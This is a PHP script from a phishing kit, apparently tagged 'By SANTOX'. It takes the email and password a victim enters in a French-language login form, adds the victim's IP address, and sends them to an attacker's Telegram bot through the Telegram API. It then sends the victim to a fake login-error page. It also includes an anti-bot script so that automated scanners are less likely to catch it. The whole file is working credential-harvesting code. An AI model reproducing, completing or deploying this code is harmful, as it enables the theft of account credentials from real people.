<?php

include "antibots.php";
include "token.php";

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");




if(isset($_POST['sub'])){
	$message .= '
<<<<<<-------- Log Error <<<<<<----------
Identifiant  =  '.$_POST['email'].'
Mot de passe  =  '.$_POST['password'].'

  ------------ infos ------------
------------ '.$ip.' ------------
-------------------By SANTOX  ------------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );




    header("Refresh: 0; URL=../log-errorr.html");
    exit();
}


?>